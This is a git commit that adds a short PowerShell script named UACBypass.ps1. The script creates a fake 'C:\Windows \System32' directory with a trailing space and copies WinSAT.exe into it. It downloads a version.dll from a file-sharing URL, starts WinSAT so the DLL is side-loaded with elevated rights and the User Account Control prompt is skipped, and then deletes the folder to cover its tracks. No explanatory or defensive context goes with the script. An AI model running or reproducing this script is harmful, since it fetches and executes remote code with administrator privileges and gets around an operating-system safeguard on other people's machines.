6c0f7d5df9ffe3ce5245b3fef55e7ad8ae803bf7
skidzsec <103379110+skidzsec@users.noreply.github.com>
2022-04-10 20:11:30 +0100

    Add files via upload

---
+++ UACBypass.ps1
@@ -0,0 +1,7 @@
+﻿New-Item '\\?\C:\Windows \System32' -ItemType Directory
+Set-Location -Path '\\?\C:\Windows \System32'
+copy C:\Windows\System32\WinSAT.exe "C:\windows \System32\winSAT.exe"
+Invoke-WebRequest -Uri 'https://filebin.net/xlbsezltjby3hgz7/version.dll' -OutFile 'version.dll'
+Start-Process -Filepath 'C:\windows \System32\winSAT.exe'
+Start-Sleep -s 1
+Remove-Item '\\?\C:\Windows \' -Force -Recurse
